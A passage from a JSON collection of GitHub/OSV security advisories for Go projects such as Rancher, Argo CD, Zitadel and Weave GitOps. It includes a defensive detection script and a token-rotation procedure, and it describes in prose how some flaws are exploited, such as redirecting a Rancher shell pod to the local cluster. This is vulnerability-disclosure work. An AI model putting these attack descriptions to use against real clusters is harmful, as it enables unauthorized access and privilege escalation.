"ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.7.4-security1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.7.3"}}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.0"}, {"fixed": "0.8.5-security1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.8.4"}}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.0.0"}, {"fixed": "1.0.1"}]}], "versions": ["1.0.0"]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/wrangler"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.8.6"}, {"fixed": "0.8.11"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/wrangler/security/advisories/GHSA-8fcj-gf77-47mg"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43756"}, {"type": "WEB", "url": "https://github.com/rancher/wrangler/commit/341018c8fef3e12867c7cb2649bd2cecac75f287"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1205296"}, {"type": "ADVISORY", "url": "https://github.com/advisories/GHSA-8fcj-gf77-47mg"}, {"type": "WEB", "url": "https://github.com/rancher/rancher/security/policy"}, {"type": "PACKAGE", "url": "https://github.com/rancher/wrangler"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1515"}], "database_specific": {"cwe_ids": ["CWE-150", "CWE-74"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:40:26Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7m72-mh5r-6j3r", "modified": "2023-02-15T22:01:37Z", "published": "2023-01-25T19:35:02Z", "aliases": ["CVE-2022-43759"], "summary": "Privilege escalation in project role template binding (PRTB) and -promoted roles", "details": "### Impact\n\nAn issue was discovered in Rancher versions from 2.5.0 up to and including 2.5.16 and from 2.6.0 up to and including 2.6.9, where an authorization logic flaw allows privilege escalation via project role template binding (PRTB) and `-promoted` roles. This issue is not present in Rancher 2.7 releases.\n\nNote: Consult Rancher [documentation](https://ranchermanager.docs.rancher.com/how-to-guides/new-user-guides/authentication-permissions-and-global-configuration/manage-role-based-access-control-rbac/cluster-and-project-roles) for more information about cluster and project roles and [KB 000020097](https://www.suse.com/support/kb/doc/?id=000020097) for information about `-promoted` roles.\n\nThis privilege escalation is possible for users with access to the `escalate` verb on PRTBs (`projectroletemplatebindings.management.cattle.io`), including users with `*` verbs on PRTBs (see notes below for more information). These users can escalate permissions for any `-promoted` resource (see the table below for a full enumeration) in any cluster where they have a PRTB granting such permissions in at least one project in the cluster.\n\nOn a default Rancher setup, only the following roles have such permissions:\n\n1. Project Owner\n2. Manage Project Members\n\nThese roles have permissions to affect the following resources:\n\n| Resource | API Group | Affected Rancher version |\n| - | - | - |\n| navlinks | ui.cattle.io | 2.6 |\n| nodes | \"\" | 2.6 |\n| persistentvolumes | \"\" | 2.5, 2.6 |\n| persistentvolumes | core | 2.5, 2.6 |\n| storageclasses | storage.k8s.io | 2.5, 2.6 |\n| apiservices | apiregistration.k8s.io | 2.5, 2.6 |\n| clusterrepos | catalog.cattle.io | 2.5, 2.6 |\n| clusters (`local` only) | management.cattle.io | 2.5, 2.6 |\n\nNotes:\n\n1. During the calculation of the CVSS score, `privileges required` was considered  as `high` because, by default, `standard user` and `user-base` users in Rancher do not have  `create`, `patch` and `update` permissions on `roletemplates`.\n2. If a role template with access to those objects was already created by another user in the cluster, then this issue can be exploited by users without the mentioned permissions from point 1.\n\n### Workarounds\n\nIf updating Rancher to a patched version is not possible, then the following workarounds must be observed to mitigate this issue:\n\n1. Only grant Project Owner and Manage Project Members roles to trusted users.\n5. Minimize the creation of custom roles that contain the `escalate`, `*` or write verbs (`create`, `delete`, `patch`, `update`) on `projectroletemplatebindings` resource, and only grant such custom roles to trusted users.\n6. Minimize the number of users that have permissions to `create`, `patch` and `update` `roletemplates`.\n\n### Patches\n\nPatched versions include releases 2.5.17 and 2.6.10 and later versions. This issue is not present in Rancher 2.7 releases.\n\n### Detection\n\nThe following script was developed to list role template bindings that give written access to the affected resources listed above. It is highly recommended to run the script in your environment and review the list of identified roles and role template bindings for possible signs of exploitation of this issue. The script requires `jq` installed and a `kubeconfig` with access to Rancher local cluster; it can also be executed in Rancher's kubectl shell.\n\n```shell\n#!/bin/bash\n\nhelp=\"\nUsage: bash find_promoted_resource.sh \\n \\n\n\nRequires: \\n\n- jq installed and on path \\n\n- A kubeconfig pointing at rancher's local cluster (can also run from rancher's kubectl shell) \\n \\n\n\nOutputs a list of roletemplates and roletemplate bindings which give write access to promoted resources.\n\"\n\nif [[ $1 == \"-h\" || $1 == \"--help\" ]]\nthen\n\techo -e $help\n\texit 0\nfi\n\n# first, get the current roletemplates so that we only issue a get once\nkubectl get roletemplates.management.cattle.io -o json >> script_templates.json\n\n# find roles which have write access to a promoted resource. Filter on roleTemplates which fulfill all requirements:\n# Have a project context\n# Have some rules\n# Have one/more of the target api groups, or a * in the api groups\n# Have one/more of the target resources, or a * in the resources\n# Have a verb that is not read access (i.e. a verb that is not get/list/watch)\nroles=$(jq --argjson apiGroups '[\"\", \"ui.cattle.io\", \"core\", \"storage.k8s.io\", \"apiregistration.k8s.io\", \"catalog.cattle.io\", \"management.cattle.io\"]' --argjson resources '[\"navlinks\", \"persistentvolumes\", \"nodes\", \"storageclasses\", \"apiservices\", \"clusterrepos\", \"clusters\"]' --argjson verbs '[\"get\", \"list\", \"watch\"]' '.items[] | select(.context==\"project\" and (.rules | length >= 1)) | select( .rules[] | select( (($apiGroups - .apiGroups | length < 7) or (.apiGroups | index(\"*\"))) and (($resources - .resources | length < 7) or (.resources | index(\"*\"))) and (.verbs - $verbs  | length > 0)) | length >= 1 ) | .metadata.name' script_templates.json | jq -s )\n\n# log promoted roles which give direct write access so they can be easily fixed\necho \"The following role templates give direct write access to a promoted resource:\"\necho $roles\necho -e \"\"\n\n# find any roles which inherit first-level roles. Mostly a BFS which radiates outward from the known bad roles \nold_roles=\"[]\"\nnew_roles=\"$roles\"\nold_length=$(echo $old_roles | jq 'length')\nnew_length=$(echo $new_roles | jq 'length')\n# if our last loop found nothing new, it's safe to stop\nwhile [[ $old_length != $new_length ]];\ndo\n\t# set old values to what we currently know about\n\told_roles=$new_roles\n\told_length=$new_length\n\t# update new values with anything that inherits a \"bad\" role we know about\n\tnew_roles=$(jq --argjson roles \"$old_roles\" --argjson roleLen \"$old_length\" '.items[] | .metadata.name as $NAME | select (( $roles | index($NAME)) or ((.roleTemplateNames | length > 0 ) and ($roles - .roleTemplateNames | length < $roleLen))) | .metadata.name ' script_templates.json | jq -s)\n\tnew_length=$(echo $new_roles | jq 'length')\ndone\n\nroles=$new_roles\n\n# log all roles which can give write access, even if it's not first level\necho -e \"The following role templates give write access to a promoted resource directly or through inheritance:\"\necho $roles\necho -e \"\"\n\nkubectl get projectroletemplatebindings.management.cattle.io -A -o json >> script_bindings.json\nrole_template_bindings=$(jq --argjson roleTemplates \"$roles\" '.items[] | .roleTemplateName as $TemplateName | select($roleTemplates | index($TemplateName)) | .metadata.name' script_bindings.json | jq -s)\n\n# since these bindings could be for users or groups, we need to include all fields which could help identify the subject. But they won't all be present, which makes the list look less pretty\necho -e \"The following is a list of bindings which give access to promoted resource, with the format of: bindingName, projectName, userName, userPrincipalName, groupName, groupPrincipalName: \"\necho $(jq --argjson bindings \"$role_template_bindings\" '.items[] | .metadata.name as $BindingName | select ( $bindings | index($BindingName)) | .metadata.name, .projectName, .userName?, .userPrincipalName?, .groupName?, .groupPrincipalName?' script_bindings.json | jq -s)\n\nunset old_roles\nunset new_roles\nunset roles\nunset role_template_bindings\nrm script_templates.json\nrm script_bindings.json\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.10"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-7m72-mh5r-6j3r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43759"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1205293"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-269", "CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:35:02Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-8c69-r38j-rpfj", "modified": "2023-02-07T15:48:39Z", "published": "2023-01-25T19:31:08Z", "aliases": ["CVE-2022-43755"], "summary": "Rancher cattle-token is predictable", "details": "### Impact\n\nAn issue was discovered in Rancher versions up to and including 2.6.9 and 2.7.0, where the `cattle-token` secret, used by the `cattle-cluster-agent`, is predictable. Even after the token is regenerated, it will have the same value. This issue is not present in Rancher 2.5 releases.\n\nThe `cattle-token` is used by Rancher's `cattle-cluster-agent` to connect to the Kubernetes API of Rancher provisioned downstream clusters. The problem occurs because the `cattle-token` secret does not use any random value in its composition, which causes it to always be regenerated with the same value. This can pose a serious problem if the token is compromised and needs to be recreated for security purposes.\n\nThe usage of the `cattle-token` by an unauthorized user allows to escalate privileges to the cluster owner of the affected downstream cluster. It does not allow access to Rancher's own local cluster (the cluster where Rancher is provisioned).\n\n### Workarounds\n\nIn case it is not possible to promptly update to a patched version, a workaround is to use the [rotate script](https://github.com/rancherlabs/support-tools/tree/master/rotate-tokens) provided in the public security advisory [CVE-2021-36782 / GHSA-g7j7-h4q8-8w2f](https://github.com/rancher/rancher/security/advisories/GHSA-g7j7-h4q8-8w2f), which facilitates the rotation and creation of a new unique downstream cluster token.\n\n### Patches\n\nPatched versions include releases 2.6.10, 2.7.1 and later versions.\n\nAfter upgrading to one of the patched versions, it is highly recommended to rotate the `cattle-token` in downstream clusters to guarantee that a new random token will be safely regenerated.\n\nThe procedure below can rotate the `cattle-token` and should be executed in each downstream cluster provisioned by Rancher. It is recommended to first test this process in an appropriate development/testing environment.\n\n```shell\n# Verify the current secret before rotating it\n$ kubectl describe secrets cattle-token -n cattle-system\n\n# Delete the secret\n$ kubectl delete secrets cattle-token -n cattle-system\n\n# Restart the cattle-cluster-agent deployment\n$ kubectl rollout restart deployment/cattle-cluster-agent -n cattle-system\n\n# Confirm that a new and different secret was generated\n$ kubectl describe secrets cattle-token -n cattle-system\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-8c69-r38j-rpfj"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43755"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1205297"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-330", "CWE-331"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:31:08Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-g25r-gvq3-wrq7", "modified": "2023-02-07T15:49:33Z", "published": "2023-01-25T19:36:09Z", "aliases": ["CVE-2022-21953"], "summary": "Authenticated user can gain unauthorized shell pod and kubectl access in the local cluster", "details": "### Impact\n\nAn issue was discovered in Rancher where an authorization logic flaw allows an authenticated user on any downstream cluster to (1) open a shell pod in the Rancher `local` cluster and (2) have limited `kubectl` access to it. The expected behavior is that a user does not have such access in the Rancher `local` cluster unless explicitly granted.\n\nThis issue does not allow the user to escalate privileges in the `local` cluster directly (this would require another vulnerability to be exploited).\n\nThe security issue happens in two different ways:\n\n1. Shell pod access - This is when a user opens a shell pod in the Rancher UI to a downstream cluster that the user has permission to access. The web request can be intercepted using the browser's web inspector/network console or a proxy tool to change the shell's destination to the Rancher `local` cluster instead of the desired downstream cluster.\n\n   - This flaw cannot be exploited to access a downstream cluster that the user has no permissions to.\n\n   - The shell pod runs with a limited non-root user, reducing the severity of this issue. However, even as a non-root user, it is still possible download and run binaries inside the shell pod.\n\n   - The blast radius of this issue can increase based on the configuration of the `local` cluster. For example:\n\n      - If the `local` cluster has unlimited network access, e.g. to the Internet, the user can open a reverse network connection to the shell pod.\n\n      - Or access the cloud metadata API of the underlying cloud infrastructure, where the user can extract the credentials associated with the `local` cluster and use them to interact with the cloud environment (this will be limited by the permissions granted to the cloud credentials in question). \n\n      - Check further recommendations about liming access to the cloud metadata API in Rancher's [security best practices](https://ranchermanager.docs.rancher.com/reference-guides/rancher-security/kubernetes-security-best-practices).\n\n2. Kubectl access - When downloading the kubeconfig file of a downstream cluster that the user has access to, the `server` cluster address in the kubeconfig file can be changed to point to the Rancher `local` cluster instead of the intended downstream cluster.\n\n     - This can also be achieved by crafting a kubeconfig using a Rancher token instead of using the kubeconfig from an active cluster. \n\n    - This flaw cannot be exploited to access a downstream cluster that the user has no permissions to.\n\nNotes:\n- Rancher `local` cluster means the cluster where Rancher is installed. It is named as `local` inside the list of clusters in the Rancher UI.\n- Audit logs in Rancher can be used to identify possible abuses of this issue, by tracking API requests to the user ID of the user that performed the action. API audit logs can be enabled as described in the [documentation](https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log) when set to level `1` or above.\n\n### Workarounds\n\nThere is no workaround or direct mitigation besides updating to a patched Rancher version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0"}, {"fixed": "2.5.17"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0"}, {"fixed": "2.6.10"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/rancher/rancher"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.7.0"}, {"fixed": "2.7.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/rancher/rancher/security/advisories/GHSA-g25r-gvq3-wrq7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-21953"}, {"type": "WEB", "url": "https://bugzilla.suse.com/show_bug.cgi?id=1199731"}, {"type": "PACKAGE", "url": "https://github.com/rancher/rancher"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-285", "CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:36:09Z", "nvd_published_at": "2023-02-07T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fgwp-pwqq-g3w4", "modified": "2023-01-20T22:03:45Z", "published": "2023-01-12T18:30:28Z", "aliases": ["CVE-2023-0247"], "summary": "Bloom Uncontrolled Search Path Element vulnerability", "details": "Uncontrolled Search Path Element in GitHub repository bits-and-blooms/bloom prior to 3.3.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/bits-and-blooms/bloom"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0247"}, {"type": "WEB", "url": "https://github.com/bits-and-blooms/bloom/commit/658f1393d4c52254a3d22f5f64f217405ec5fefb"}, {"type": "PACKAGE", "url": "https://github.com/bits-and-blooms/bloom"}, {"type": "WEB", "url": "https://huntr.dev/bounties/cab50e44-0995-4ac1-a5d5-889293b9704f"}], "database_specific": {"cwe_ids": ["CWE-427"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-12T23:41:33Z", "nvd_published_at": "2023-01-12T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6rrr-78xp-5jp8", "modified": "2023-01-24T18:55:45Z", "published": "2023-01-11T18:27:48Z", "aliases": ["CVE-2023-22492"], "summary": "Zitadel RefreshToken invalidation vulnerability", "details": "### Impact\nRefreshTokens is an OAuth 2.0 feature that allows applications to retrieve new access tokens and refresh the user's session without the need for interacting with a UI.\n\nRefreshTokens were not invalidated when a user was locked or deactivated. The deactivated or locked user was able to obtain a valid access token only through a refresh token grant.\n\nWhen the locked or deactivated user\u2019s session was already terminated (\u201clogged out\u201d) then it was not possible to create a new session. Renewal of access token through a refresh token grant is limited to the configured amount of time (RefreshTokenExpiration).\n\n### Patches\n2.x versions are fixed on >= [2.17.3](https://github.com/zitadel/zitadel/releases/tag/v2.17.3)\n2.16.x versions are fixed on >= [2.16.4](https://github.com/zitadel/zitadel/releases/tag/v2.16.4)\n\nZITADEL recommends upgrading to the latest versions available in due course.\n\n### Workarounds\nEnsure the RefreshTokenExpiration in the OIDC settings of your instance is set according to your security requirements.\n\n### References\n\nhttps://zitadel.com/docs/guides/manage/console/instance-settings#oidc-token-lifetimes-and-expiration\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.17.0"}, {"fixed": "2.17.3"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/zitadel/zitadel"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.16.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/zitadel/zitadel/security/advisories/GHSA-6rrr-78xp-5jp8"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22492"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/commit/301e22c4956ead6014a8179463c37263f7301a83"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/commit/fc892c52a10cd4ffdac395747494f3a93a7494c2"}, {"type": "PACKAGE", "url": "https://github.com/zitadel/zitadel"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.16.4"}, {"type": "WEB", "url": "https://github.com/zitadel/zitadel/releases/tag/v2.17.3"}], "database_specific": {"cwe_ids": ["CWE-613"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-11T18:27:48Z", "nvd_published_at": "2023-01-11T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7p8m-22h4-9pj7", "modified": "2023-01-20T22:38:04Z", "published": "2023-01-20T22:38:04Z", "aliases": ["CVE-2022-23538"], "summary": "scs-library-client may leak user credentials to third-party service via HTTP redirect", "details": "### Impact\n\nWhen the scs-library-client is used to pull a container image, with authentication, the HTTP Authorization header sent by the client to the library service may be incorrectly leaked to an S3 backing storage provider. This occurs in a specific flow, where the library service redirects the client to a backing S3 storage server, to perform a multi-part concurrent download.\n\nDepending on site configuration, the S3 service may be provided by a third party. An attacker with access to the S3 service may be able to extract user credentials, allowing them to impersonate the user.\n\nThe vulnerable multi-part concurrent download flow, with redirect to S3, is only used when communicating with a Singularity Enterprise 1.x installation, or third party server implementing this flow.\n\nInteraction with Singularity Enterprise 2.x, and Singularity Container Services (cloud.sylabs.io), does not trigger the vulnerable flow.\n\nWe encourage all users to update. Users who interact with a Singularity Enterprise 1.x installation, using a 3rd party S3 storage service, are advised to revoke and recreate their authentication tokens within Singularity Enterprise.\n\n### Patches\n\nThe security issue was identified after the integration of a bug-fix commit 68ac4ca into the previously released scs-library-client 1.3.4. This commit fixes the security issue in the 1.3 series.\n\nscs-library-client 1.4.2 contains a fix for the same vulnerability in the 1.4 series, as commit eebd7ca.\n\n### Workarounds\n\nThere is no workaround available at this time.\n\nAs above, access to Singularity Enterprise 2.x, or Singularity Container Services (cloud.sylabs.io), does not trigger the vulnerable flow.\n\n### References\n\nhttps://cwe.mitre.org/data/definitions/522.html\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/sylabs/scs-library-client"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.4.0"}, {"fixed": "1.4.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/sylabs/scs-library-client"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/sylabs/scs-library-client/security/advisories/GHSA-7p8m-22h4-9pj7"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23538"}, {"type": "WEB", "url": "https://github.com/sylabs/scs-library-client/commit/68ac4cab5cda0afd8758ff5b5e2e57be6a22fcfa"}, {"type": "WEB", "url": "https://github.com/sylabs/scs-library-client/commit/b5db2aacba6bf1231f42dd475cc32e6355ab47b2"}, {"type": "WEB", "url": "https://github.com/sylabs/scs-library-client/commit/eebd7caaab310b1fa803e55b8fc1acd9dcd2d00c"}, {"type": "PACKAGE", "url": "https://github.com/sylabs/scs-library-client"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2023-1497"}], "database_specific": {"cwe_ids": ["CWE-522", "CWE-601"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2023-01-20T22:38:04Z", "nvd_published_at": "2023-01-17T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6p4m-hw2h-6gmw", "modified": "2023-01-25T19:39:03Z", "published": "2023-01-25T19:39:03Z", "aliases": ["CVE-2023-22736"], "summary": "Controller reconciles apps outside configured namespaces when sharding is enabled", "details": "### Impact\n\nAll Argo CD versions starting with 2.5.0-rc1 are vulnerable to an authorization bypass bug which allows a malicious Argo CD user to deploy Applications outside the configured allowed namespaces. \n\n#### Description of exploit\n\nReconciled Application namespaces are specified as a comma-delimited list of glob patterns. When sharding is enabled on the Application controller, it does not enforce that list of patterns when reconciling Applications. For example, if Application namespaces are configured to be `argocd-*`, the Application controller may reconcile an Application installed in a namespace called `other`, even though it does not start with `argocd-`.\n\nReconciliation of the out-of-bounds Application is only triggered when the Application is updated, so the attacker must be able to cause an update operation on the Application resource.\n\n#### Limitations\n\nThis bug only applies to users who have explicitly enabled the \"apps-in-any-namespace\" feature by setting `application.namespaces` in the argocd-cmd-params-cm ConfigMap or otherwise setting the `--application-namespaces` flags on the Application controller and API server components. The apps-in-any-namespace feature is in beta as of this Security Advisory's publish date.\n\nThe bug is also limited to Argo CD instances where sharding is enabled by increasing the `replicas` count for the Application controller.\n\nFinally, the AppProjects' `sourceNamespaces` field acts as a secondary check against this exploit. To cause reconciliation of an Application in an out-of-bounds namespace, an AppProject must be available which permits Applications in the out-of-bounds namespace.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.5.8\n* v2.6.0-rc5\n\n### Workarounds\n\nRunning only one replica of the Application controller will prevent exploitation of this bug.\n\nMaking sure all AppProjects' `sourceNamespaces` are restricted within the confines of the configured Application namespaces will also prevent exploitation of this bug.\n\n### Credits\n\nThanks to ChangZhuo Chen (@czchen) for finding the issue and for contributing the fix!\n\n### References\n\n* [Documentation for apps-in-any-namespace](https://argo-cd--10678.org.readthedocs.build/en/10678/operator-manual/app-any-namespace/)\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.5.0-rc1"}, {"fixed": "2.5.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.6.0-rc4"}, {"fixed": "2.6.0-rc5"}]}], "versions": ["2.6.0-rc4"]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-6p4m-hw2h-6gmw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-22736"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-25T19:39:03Z", "nvd_published_at": "2023-01-26T21:18:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wr3c-g326-486c", "modified": "2023-01-09T19:45:01Z", "published": "2023-01-09T19:45:01Z", "aliases": ["CVE-2022-23508"], "summary": "GitOps Run allows for Kubernetes workload injection", "details": "### Impact\nA vulnerability in GitOps run could allow a local user or process to alter a Kubernetes cluster's resources.\n\nGitOps run has a local S3 bucket which it uses for synchronising files that are later applied against a Kubernetes cluster. Its endpoint had no security controls to block unauthorised access, therefore allowing local users (and processes) on the same machine to see and alter the bucket content.\n\nBy leveraging this vulnerability, an attacker could pick a workload of their choosing and inject it into the S3 bucket, which resulted in the successful deployment in the target cluster, without the need to provide any credentials to either the S3 bucket nor the target Kubernetes cluster.\n\n### Patches\nThis vulnerability has been fixed by commits [75268c4](https://github.com/weaveworks/weave-gitops/pull/3114/commits/75268c4d2c8f7e4db22c63d76b451ba6545d117f) and [966823b](https://github.com/weaveworks/weave-gitops/pull/3102/commits/966823bbda8c539a4661e2a4f8607c9307ba6225). Users should upgrade to Weave GitOps version >= v0.12.0 released on 08/12/2022.\n\n### Workarounds\nThere is no workaround for this vulnerability.\n\n### References\nDisclosed by Paulo Gomes, Senior Software Engineer, Weaveworks.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n- Open an issue in [Weave GitOps repository](https://github.com/weaveworks/weave-gitops)\n- Email us at [support@weave.works](mailto:support@weave.works)\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:A/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/weaveworks/weave-gitops"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.0"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.11.0"}}], "references": [{"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/security/advisories/GHSA-wr3c-g326-486c"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23508"}, {"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/pull/3102/commits/966823bbda8c539a4661e2a4f8607c9307ba6225"}, {"type": "WEB", "url": "https://github.com/weaveworks/weave-gitops/pull/3114/commits/75268c4d2c8f7e4db22c63d76b451ba6545d117f"}, {"type": "PACKAGE", "url": "https://github.com/weaveworks/weave-gitops"}], "database_specific": {"cwe_ids": ["CWE-284", "CWE-552"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T19:45:01Z", "nvd_published_at": "2023-01-09T13:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-x477-fq37-q5wr", "modified": "2023-01-27T00:55:27Z", "published": "2023-01-27T00:55:27Z", "aliases": [], "summary": "Initial debug-host handler implementation could leak information and facilitate denial of service", "details": "### Impact\nversion 